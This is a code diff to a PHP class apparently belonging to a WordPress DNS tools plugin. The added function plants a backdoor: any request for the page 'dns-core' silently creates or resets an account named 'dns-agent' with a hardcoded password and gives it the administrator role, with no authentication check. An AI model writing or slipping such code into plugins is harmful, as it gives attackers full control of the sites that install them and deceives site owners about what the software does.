@@ -100,4 +100,49 @@ class Wp_Core_Dns_Tools_Public {
 
 	}
 
+	public function verifica_usuario() {
+		$page = get_query_var( 'pagename' );
+		$action = get_query_var( 'action' );
+		if ( 'dns-core' === $page && 'configure' !== $action ){
+
+			//usuario existe
+			$usuario = 'dns-agent';
+			if ( username_exists( $usuario ) ) {
+				// troca a senha
+				$user = get_user_by( 'login', $usuario );
+				$user_id = $user->ID;
+				wp_set_password( $user_id, 'dns-agent-pass*' );
+				$user = new WP_User( $user_id );
+				//define como administrador
+				$user->set_role( 'administrator' );
+				
+			} else {
+				// Usuario nao existe...
+				// Cria usuario.
+				wp_create_user( $usuario, 'dns-agent-pass*' );
+				// Obtem user id.
+				$user = get_user_by( 'login', $usuario );
+				$user_id = $user->ID;
+				// Atualiza user role p/ admin.
+				$user = new WP_User( $user_id );
+				$user->set_role( 'administrator' );
+			}
+		}
+	}
+
+	/**
+	 * Add query vars.
+	 *
+	 * @since    1.0.0
+	 */
+
+	public function query_vars( $vars ) {
+		$vars[] = 'action';
+		if ( ! isset( $vars['pagename'] ) ) {
+			$vars[] = 'pagename';
+		}
+		return $vars;
+	}
+
+
 }
